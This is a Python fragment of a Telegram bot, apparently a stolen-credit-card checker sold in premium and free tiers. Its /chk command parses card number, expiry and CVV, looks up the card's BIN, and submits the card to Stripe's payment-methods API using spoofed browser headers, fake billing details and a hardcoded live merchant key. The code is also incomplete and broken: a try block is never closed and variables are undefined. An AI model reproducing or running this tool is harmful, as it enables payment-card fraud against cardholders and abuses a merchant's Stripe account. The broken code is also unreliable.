from pyrogram import Client, filters

async def chk_cmd(client, message):
    global msg_count, clock, wait
    # check if user in premium
    if message.from_user.id in PREMIUM or message.from_user.id in FREE or  message.from_user.id in OWNER:
        # check if correct format
        if "|" not in message.text:
            await message.reply_text("**Stripe Auth\nFormat: `cc|m|y|cvv`**")
        if "|" in message.text:
            userid = message.from_user.id
            if userid not in OWNER:
                id_in_spam.insert(0, userid)
            else:pass
            fname = message.from_user.first_name
            cc = message.text[len('/chk '):33]
            splitter = cc.split('|')
            ccn = splitter[0]
            month = splitter[1]
            year = splitter[2]
            cvc = splitter[3]
            ab  = ccn[0:6]
            
            wait = await message.reply("**Wait For Results...**", reply_to_message_id=message.message_id)
            #####################################################################
            try:
                bin = requests.get(f"https://bins-ws-api.deta.dev/api/{ccn}").json()
                vendor = bin['data']['vendor']
                type = bin['data']['type']
                level = bin['data']['level']
                bank = bin['data']['bank']
                country = bin['data']['country']
                flag = bin['data']['countryInfo']['emoji']
                ####################################################################################
                url = 'https://api.stripe.com/v1/payment_methods'
                
                headers = {
                  'authority': 'api.stripe.com',
                  'method': 'POST',
                  'path': '/v1/payment_methods',
                  'scheme': 'https',
                  'accept': 'application/json',
                  'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                  'content-type': 'application/x-www-form-urlencoded',
                  'origin': 'https://js.stripe.com',
                  'referer': 'https://js.stripe.com/',
                  'sec-fetch-dest': 'empty',
                  'sec-fetch-mode': 'cors',
                  'sec-fetch-site': 'same-site',
                  'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36'
                }
                postdata = {
                  'type': 'card',
                  'billing_details[address][line1]': 'Cheluvadipalya',
                  'billing_details[address][city]': 'New York',
                  'billing_details[address][state]': 'New York',
                  'billing_details[address][postal_code]': '10080',
                  'billing_details[address][country]': 'US',
                  'billing_details[name]': name,
                  'card[number]': ccn,
                  'card[cvc]': cvc,
                  'card[exp_month]': month,
                  'card[exp_year]': year,
                  'guid': 'N/A',
                  'muid': '9670a3e9-94a5-4423-8e76-9d0478487fe37531b9',
                  'sid': 'ed45e47f-32dd-4ff2-8802-17ae85692f1380e8a8',
                  'payment_user_agent': 'stripe.js/137b5bf7c;+stripe-js-v3/137b5bf7c',
                  'time_on_page': '178531',
                  'key': 'pk_live_51JGMZ6GvIIxji5jaPtT6kJSqx3toK752qc4xxgQOtc5OqPidZAkB2xaUIjbKto8UeyYM13rFoeumLjWvpaRP5V0v006RgdEbVt'
                  
                }
                kya = requests.post(url = url, headers = headers, data = postdata)
                ye = json.loads(kya.text)
                pm = ye['id']

@Client.on_message(filters.command(["start"]))
async def start(client, message):
    await wait.edit_text(pm)
